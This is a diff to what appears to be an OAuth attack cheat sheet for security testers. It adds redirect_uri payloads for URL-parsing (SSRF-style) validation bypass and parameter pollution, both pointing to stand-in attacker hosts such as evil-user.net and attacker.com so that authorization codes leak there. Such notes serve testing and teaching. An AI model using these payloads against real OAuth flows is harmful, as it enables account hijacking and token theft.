@@ -3,7 +3,7 @@
 ## **Table of Contents**
 1. [Improper Implementation of the Implicit Grant Type](#improper-implementation-of-the-implicit-grant-type)
 2. [Exploiting Absense of State Parameter](#Exploiting-Absense-of-State-Parameter)
-3. [OAuth Account Hijacking via `redirect_uri`](#oauth-account-hijacking-via-redirect_uri)
+3. [OAuth Account Hijacking With SSRF and Parameter via `redirect_uri`](#oauth-account-hijacking-with-ssrf-and-parameter-pollution-via-redirect_uri)
 4. [Stealing OAuth Access Tokens via an Open Redirect](#stealing-oauth-access-tokens-via-an-open-redirect)
 5. [Stealing OAuth Access Tokens via a Proxy Page](#stealing-oauth-access-tokens-via-a-proxy-page)
 6. [Exploiting `response_mode` and `redirect_uri`](#exploiting-response_mode-and-redirect_uri)
@@ -44,7 +44,7 @@ Host: client-app.net
 
 ---
 
-### OAuth Account Hijacking via `redirect_uri`
+### OAuth Account Hijacking With SSRF and Parameter Pollution via `redirect_uri`
 
 Depending on the grant type, the `redirect_uri` parameter is used to send the authorization code to the specified domain in the `redirect_uri`. If an OAuth mechanism allows arbitrary domains to be specified in the `redirect_uri`, an attacker could exploit this flow to hijack the authorization code.
 
@@ -58,7 +58,11 @@ redirect_uri=https://attacker.com
 ```
 The code is sent to `attacker.com`.<br>
 <br>
-***Note: If this process not work, try with `ssrf defense bypass` technique and `parameter pollution`.***<br>
+***Note: If this process not work, try with `ssrf defense bypass` technique and `parameter pollution`.** <br>
+<br>
+**SSRF** : `redirect_uri=https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`<br>
+**Parameter Pollution** : `client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
+<br>
 <br>Check this for more details >> [Flawed redirect_uri validation](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens)
 
 ---
